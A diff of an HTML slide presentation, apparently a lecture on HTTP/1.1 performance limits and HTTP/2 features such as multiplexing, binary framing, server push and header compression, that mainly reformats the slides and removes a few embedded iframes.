-		<iframe src="https://www.w3.org/Protocols/HTTP/AsImplemented.html" frameborder="0" width="100%" height="80%" ></iframe>
-	</section>
+<section class="slide">
+	<h2>HTTP-request stages</h2>
+	<div style="position:relative;width: 72%;height: 75%;overflow: hidden;margin: 0 auto;"><img class="place"
+																								src="images/http-request-stages.png"
+																								style="transform-origin: center;transform: translate(-50%,-48%) scale(0.85);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Hypertext Transfer Protocol: HTTP/1.1</h2>
-		<div style="position:relative;width: 100%;height: 100%;overflow: hidden;margin: 0 auto;">
-			<iframe src="https://rfc2.ru/2068.rfc/original" frameborder="0" width="100%" height="80%" style="transform-origin: center;transform: translate(10%,-10%) scale(1.2)"></iframe>
-		</div>
-	</section>
+<section class="slide">
+	<h2>HTTP-latency</h2>
+	<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="images/latency.png"
+																				style="transform-origin: center;transform: translate(-50%,-50%) scale(0.95);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>HTTP/1.1</h2>
-		<p style="line-height: 1.3em">HTTP/1.1 was designed for connections and bandwidth that are significantly different today</p>
-		<ul lang="ru">
-			<li><mark>Single parallel</mark> request per connection</li>
-			<li>Max. 10 connections <mark>per domain</mark></li>
-			<li>Exclusively <mark>client-imitated</mark> requests</li>
-			<li><mark>Uncompressed and redundant</mark> request and response headers</li>
-			<li><mark>Optional</mark> data compression</li>
-			<li>HTTP is <mark>slow</mark>, but HTTPS is <mark>even slower</mark></li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2>HTTP-latency</h2>
+	<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place"
+																				src="images/latency-bandwidth.svg"
+																				style="transform-origin: center;transform: translate(-50%,-50%) scale(0.8);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>HTTP-request stages</h2>
-		<div style="position:relative;width: 72%;height: 75%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/http-request-stages.png" style="transform-origin: center;transform: translate(-50%,-48%) scale(0.85);"></div>
-	</section>
+<section class="slide">
+	<h2>One request per connection</h2>
+	<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place"
+																				src="images/one-request-per-connection.png"
+																				style="transform-origin: center;transform: translate(-50%,-50%) scale(1.2);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>HTTP-latency</h2>
-		<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="images/latency.png" style="transform-origin: center;transform: translate(-50%,-50%) scale(0.95);"></div>
-	</section>
+<section class="slide">
+	<h2>Many performance HTTP/1.1 hacks</h2>
+	<p class="medium-content"></p>
+	<ul>
+		<li>Concatenation of files</li>
+		<li>Image sprites</li>
+		<li>Domain sharding</li>
+		<li>Data inlining</li>
+		<li>Critical CSS</li>
+		<li>And more...</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>HTTP-latency</h2>
-		<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="images/latency-bandwidth.svg" style="transform-origin: center;transform: translate(-50%,-50%) scale(0.8);"></div>
-	</section>
+<section class="slide">
+	<h2>HTTP/2</h2>
+	<p style="line-height: 1.3em">HTTP/2 promises speed improvement, decreased network latency and better management of
+		assets</p>
+	<ul lang="ru">
+		<li>
+			<mark>64% reduction</mark>
+			in page load times (23% on mobile)
+		</li>
+		<li>
+			<mark>Unlimited number of parallel</mark>
+			requests per connection
+		</li>
+		<li>
+			<mark>Quicker slow-start</mark>
+			and better compression
+		</li>
+		<li>
+			<mark>One connection per host</mark>
+			, which handles all requests
+		</li>
+		<li>Developers can
+			<mark>prioritize and push</mark>
+			the resources
+		</li>
+		<li><em>Requires HTTPS for run</em></li>
+		<li>
+			<mark>Fall back</mark>
+			to HTTP/1.1
+		</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>One request per connection</h2>
-		<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="images/one-request-per-connection.png" style="transform-origin: center;transform: translate(-50%,-50%) scale(1.2);"></div>
-	</section>
+<section class="slide">
+	<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
+	<p>Servers:</p>
+	<ul lang="ru">
+		<li>nginx 1.9.5</li>
+		<li>node.js 5.0</li>
+		<li>Apache 2.4.12</li>
+		<li>Jetty 9.3 and Netty 4.1 (Java)</li>
+		<li>and more...</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Many performance HTTP/1.1 hacks</h2>
-		<p class="medium-content"></p>
+<section class="slide">
+	<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/caniuse-http2.png"
+			 style="transform-origin: center;transform: translate(-50.3%, -50%) scale(0.85);">
+	</div>
+</section>
+
+<section class="slide">
+	<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
+	<p>CDNs:</p>
+	<ul lang="ru">
+		<li>Akamai is the first major CDN to support HTTP/2 and HTTP/2 Server Push</li>
+		<li>Cloudflare supports HTTP/2 using nginx</li>
+		<li>AWS CloudFront supports HTTP/2</li>
+		<li>KeyCDN supports HTTP/2</li>
+		<li>and more...</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
+	<p>Web services (
+		<mark>HTTP/2 is used by 12.6%</mark>
+		of all the websites):
+	</p>
+	<ul lang="ru">
+		<li>google.com</li>
+		<li>youtube.com</li>
+		<li>facebook.com</li>
+		<li>wikipedia.org</li>
+		<li>vk.com</li>
+		<li>e.mail.ru (partial support ;] )</li>
+		<li>and more...</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>HTTP/2 core features</h2>
+	<ul lang="ru">
+		<li>Multiplexing (via streams, frames and messages)</li>
+		<li>Binary data format</li>
+		<li>Prioritization</li>
+		<li>Flow control</li>
+		<li>Header compression</li>
+		<li>Server push</li>
+		<li>Something else?</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Streams, Messages, and Frames</h2>
+	<blockquote>
+		<p><b>Stream</b> &mdash; a bidirectional flow of bytes within an established connection, which may carry one or
+			more messages</p>
+	</blockquote>
+	<blockquote>
+		<p><b>Message</b> &mdash; a complete sequence of frames that map to a logical request or response message</p>
+	</blockquote>
+	<blockquote>
+		<p><b>Frame</b> &mdash; the smallest unit of communication in HTTP/2, each containing a frame header, which at a
+			minimum identifies the stream to which the frame belongs</p>
+	</blockquote>
+</section>
+
+<section class="slide">
+	<h2>Streams, Messages, and Frames</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/streams-messages-frames.svg"
+			 style="transform-origin: center;transform: translate(-50%, -50%) scale(0.65);">
+	</div>
+</section>
+
+<section class="slide">
+	<h2>Streams, Messages, and Frames</h2>
+	<ul>
+		<li>SINGLE
+			<mark>TCP connection</mark>
+		</li>
 		<ul>
-			<li>Concatenation of files</li>
-			<li>Image sprites</li>
-			<li>Domain sharding</li>
-			<li>Data inlining</li>
-			<li>Critical CSS</li>
-			<li>And more...</li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>HTTP/2</h2>
-		<p style="line-height: 1.3em">HTTP/2 promises speed improvement, decreased network latency and better management of assets</p>
-		<ul lang="ru">
-			<li><mark>64% reduction</mark> in page load times (23% on mobile)</li>
-			<li><mark>Unlimited number of parallel</mark> requests per connection</li>
-			<li><mark>Quicker slow-start</mark> and better compression</li>
-			<li><mark>One connection per host</mark>, which handles all requests</li>
-			<li>Developers can <mark>prioritize and push</mark> the resources</li>
-			<li><em>Requires HTTPS for run</em></li>
-			<li><mark>Fall back</mark> to HTTP/1.1</li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
-		<p>Servers:</p>
-		<ul lang="ru">
-			<li>nginx 1.9.5</li>
-			<li>node.js 5.0</li>
-			<li>Apache 2.4.12</li>
-			<li>Jetty 9.3 and Netty 4.1 (Java)</li>
-			<li>and more...</li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/caniuse-http2.png" style="transform-origin: center;transform: translate(-50.3%, -50%) scale(0.85);">
-		</div>
-	</section>
-
-	<section class="slide">
-		<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
-		<p>CDNs:</p>
-		<ul lang="ru">
-			<li>Akamai is the first major CDN to support HTTP/2 and HTTP/2 Server Push</li>
-			<li>Cloudflare supports HTTP/2 using nginx</li>
-			<li>AWS CloudFront supports HTTP/2</li>
-			<li>KeyCDN supports HTTP/2</li>
-			<li>and more...</li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>HTTP/2 requires server-side and<br/>client-side implementations</h2>
-		<p>Web services (<mark>HTTP/2 is used by 12.6%</mark> of all the websites):</p>
-		<ul lang="ru">
-			<li>google.com</li>
-			<li>youtube.com</li>
-			<li>facebook.com</li>
-			<li>wikipedia.org</li>
-			<li>vk.com</li>
-			<li>e.mail.ru (partial support ;] )</li>
-			<li>and more...</li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>HTTP/2 core features</h2>
-		<ul lang="ru">
-			<li>Multiplexing (via streams, frames and messages)</li>
-			<li>Binary data format</li>
-			<li>Prioritization</li>
-			<li>Flow control</li>
-			<li>Header compression</li>
-			<li>Server push</li>
-			<li>Something else?</li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>Streams, Messages, and Frames</h2>
-		<blockquote>
-			<p><b>Stream</b> &mdash; a bidirectional flow of bytes within an established connection, which may carry one or more messages</p>
-		</blockquote>
-		<blockquote>
-			<p><b>Message</b> &mdash; a complete sequence of frames that map to a logical request or response message</p>
-		</blockquote>
-		<blockquote>
-			<p><b>Frame</b> &mdash; the smallest unit of communication in HTTP/2, each containing a frame header, which at a minimum identifies the stream to which the frame belongs</p>
-		</blockquote>
-	</section>
-
-	<section class="slide">
-		<h2>Streams, Messages, and Frames</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/streams-messages-frames.svg" style="transform-origin: center;transform: translate(-50%, -50%) scale(0.65);">
-		</div>
-	</section>
-
-	<section class="slide">
-		<h2>Streams, Messages, and Frames</h2>
-		<ul>
-			<li>SINGLE <mark>TCP connection</mark></li>
+			<li>ANY number of
+				<mark>bidirectional streams</mark>
+			</li>
 			<ul>
-				<li>ANY number of <mark>bidirectional streams</mark></li>
+				<li>EACH stream has a unique identifier and optional priority information that is used to carry
+					<mark>bidirectional messages</mark>
+				</li>
 				<ul>
-					<li>EACH stream has a unique identifier and optional priority information that is used to carry
-						<mark>bidirectional messages</mark>
+					<li>EACH message is a logical HTTP message, such as a request, or response, which consists of
+						<mark>one or more frames</mark>
 					</li>
 					<ul>
-						<li>EACH message is a logical HTTP message, such as a request, or response, which consists of <mark>one or more frames</mark></li>
-						<ul>
-							<li>THE frame is the <mark>smallest unit of communication</mark> that carries a specific type of data</li>
-						</ul>
+						<li>THE frame is the
+							<mark>smallest unit of communication</mark>
+							that carries a specific type of data
+						</li>
 					</ul>
 				</ul>
 			</ul>
 		</ul>
-	</section>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Binary Framing Layer</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/binary-layer.svg" style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
+<section class="slide">
+	<h2>Binary Framing Layer</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/binary-layer.svg"
+			 style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
+	</div>
+</section>
+
+<section class="slide">
+	<h2>Binary Framing Layer</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/binary-http2.svg"
+			 style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
+	</div>
+</section>
+
+<section class="slide">
+	<h2>Request and Response Multiplexing</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/http2-connection.svg"
+			 style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
+	</div>
+</section>
+
+<section class="slide">
+	<h2>Request and Response Multiplexing</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/many-wires.png"
+			 style="transform-origin: center;transform: translate(-50%, -65%) scale(0.27);">
+		<div style="overflow:hidden;height:10%;position:relative;transform:translate(0%, 250px)"><img class="place"
+																									  src="images/one-wire.jpg"
+																									  style="transform-origin: center;transform: translate(-46%, -50%) rotate(45deg) scale(0.65);">
 		</div>
-	</section>
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Binary Framing Layer</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/binary-http2.svg" style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
-		</div>
-	</section>
+<section class="slide">
+	<div style="position:fixed;width: 100%;height: 100%; top: 0; left: 0;">
+		<img class="place" src="images/http:1-loading.png"
+			 style="transform-origin: left top;top: 0;left: 0;transform: translate(0px, 0px) scale(1.25);">
+		<img class="place" src="images/http:2-loading.png"
+			 style="transform-origin: left top;top: 0;transform: translate(40%, 0px) scale(1.25);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Request and Response Multiplexing</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/http2-connection.svg" style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
-		</div>
-	</section>
+<section class="slide">
+	<h2>Stream Prioritization</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/prioretizations-of-http2.svg"
+			 style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Request and Response Multiplexing</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/many-wires.png" style="transform-origin: center;transform: translate(-50%, -65%) scale(0.27);">
-			<div style="overflow:hidden;height:10%;position:relative;transform:translate(0%, 250px)"><img class="place" src="images/one-wire.jpg" style="transform-origin: center;transform: translate(-46%, -50%) rotate(45deg) scale(0.65);"></div>
-		</div>
-	</section>
+<section class="slide">
+	<h2>One Connection Per Origin</h2>
+	<ul>
+		<li>All HTTP/2 connections are persistent, and
+			<mark>only one connection per origin is required</mark>
+		</li>
+		<li>Most HTTP transfers are short and bursty, whereas
+			<mark>TCP is optimized for long-lived, bulk data transfers</mark>
+			. By reusing the same connection HTTP/2 is able to both make
+			<mark>more efficient use of each TCP connection</mark>
+		</li>
+		<li>Reduced number of connections is a particularly
+			<mark>important feature for improving performance of HTTPS deployments</mark>
+		</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<div style="position:fixed;width: 100%;height: 100%; top: 0; left: 0;">
-			<img class="place" src="images/http:1-loading.png" style="transform-origin: left top;top: 0;left: 0;transform: translate(0px, 0px) scale(1.25);">
-			<img class="place" src="images/http:2-loading.png" style="transform-origin: left top;top: 0;transform: translate(40%, 0px) scale(1.25);">
-		</div>
-	</section>
+<section class="slide">
+	<h2>Flow Control</h2>
+	<code>404 Slide Not Found</code>
+</section>
 
-	<section class="slide">
-		<h2>Stream Prioritization</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/prioretizations-of-http2.svg" style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
-		</div>
-	</section>
+<section class="slide">
+	<h2>Server Push</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/http2-server-push.svg"
+			 style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>One Connection Per Origin</h2>
-		<ul>
-			<li>All HTTP/2 connections are persistent, and <mark>only one connection per origin is required</mark></li>
-			<li>Most HTTP transfers are short and bursty, whereas <mark>TCP is optimized for long-lived, bulk data transfers</mark>. By reusing the same connection HTTP/2 is able to both make <mark>more efficient use of each TCP connection</mark></li>
-			<li>Reduced number of connections is a particularly <mark>important feature for improving performance of HTTPS deployments</mark></li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2>Header Compression</h2>
+	<div style="position:relative;width: 100%;height: 80%;">
+		<img class="place" src="images/http2-hpack.svg"
+			 style="transform-origin: center;transform: translate(-50%, -48%) scale(0.63);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Flow Control</h2>
-		<code>404 Slide Not Found</code>
-	</section>
-
-	<section class="slide">
-		<h2>Server Push</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/http2-server-push.svg" style="transform-origin: center;transform: translate(-50%, -50%) scale(1);">
-		</div>
-	</section>
-
-	<section class="slide">
-		<h2>Header Compression</h2>
-		<div style="position:relative;width: 100%;height: 80%;">
-			<img class="place" src="images/http2-hpack.svg" style="transform-origin: center;transform: translate(-50%, -48%) scale(0.63);">
-		</div>
-	</section>
-
-	<section class="slide question">
-		<h2>So... The HTTP/2 is much good!</h2>
-	</section>
+<section class="slide question">
+	<h2>So... The HTTP/2 is much good!</h2>
+</section>
 
 
+<section class="slide">
+	<h2>Полезные ссылки</h2>
+	<ul lang="en">
+		<li>
+			<a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=ru"
+			   target="_blank">Кэширование HTTP</a> &mdash; Google Developers
+		</li>
+		<li><a href="https://developer.mozilla.org/ru/docs/WebSockets" target="_blank">WebSockets | MDN</a></li>
+		<li><a href="https://ru.wikipedia.org/wiki/JSON-RPC" target="_blank">Описание JSON-RPC</a> и хорошая <a
+				href="https://github.com/teambition/jsonrpc-lite" target="_blank">библиотечка</a> для работы с ним из
+			браузера
+		</li>
+		<li><a href="https://habrahabr.ru/post/279291/" target="_blank">ServiceWorker и CacheStorage | Habr</a></li>
+		<li>This excellent <a
+				href="https://docs.google.com/presentation/d/1r7QXGYOLCh4fcUq0jDdDwKJWNqWK1o4xMtYpKZCJYjM/present?slide=id.p19"
+				target="_blank">set of slides</a> has more information on some of the points covered in this
+			presentation
+		</li>
+		<li>Vitaly Friedman: <a href="https://youtu.be/whFhyHysYYg" target="_blank">How We Moved To HTTP/2 To Improve
+			Performance... And Failed</a></li>
+		<li>High Performance Browser Networking (O'Reilly): <a href="https://youtu.be/whFhyHysYYg" target="_blank">HTTP/2</a>
+		</li>
+	</ul>
+</section>
 
+<section class="slide">
+	<h2 class="shout">Всем спасибо!</h2>
+</section>
 
-	<section class="slide">
-		<h2>Полезные ссылки</h2>
-		<ul lang="en">
-			<li><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=ru" target="_blank">Кэширование HTTP</a> &mdash; Google Developers</li>
-			<li><a href="https://developer.mozilla.org/ru/docs/WebSockets" target="_blank">WebSockets | MDN</a></li>
-			<li><a href="https://ru.wikipedia.org/wiki/JSON-RPC" target="_blank">Описание JSON-RPC</a> и хорошая <a href="https://github.com/teambition/jsonrpc-lite" target="_blank">библиотечка</a> для работы с ним из браузера</li>
-			<li><a href="https://habrahabr.ru/post/279291/" target="_blank">ServiceWorker и CacheStorage | Habr</a></li>
-			<li>This excellent <a href="https://docs.google.com/presentation/d/1r7QXGYOLCh4fcUq0jDdDwKJWNqWK1o4xMtYpKZCJYjM/present?slide=id.p19" target="_blank">set of slides</a> has more information on some of the points covered in this presentation</li>
-			<li>Vitaly Friedman: <a href="https://youtu.be/whFhyHysYYg" target="_blank">How We Moved To HTTP/2 To Improve Performance... And Failed</a></li>
-			<li>High Performance Browser Networking (O'Reilly): <a href="https://youtu.be/whFhyHysYYg" target="_blank">HTTP/2</a></li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2 class="shout">Всем спасибо!</h2>
-	</section>
-
-	<div class="progress"></div>
-	<script src="/lib/shower/shower.min.js"></script>
-	<script src="/lib/hljs/highlight.pack.js"></script>
-	<script>hljs.initHighlightingOnLoad();</script>
+<div class="progress"></div>
+<script src="/lib/shower/shower.min.js"></script>
+<script src="/lib/hljs/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
 
 </body>
 </html>
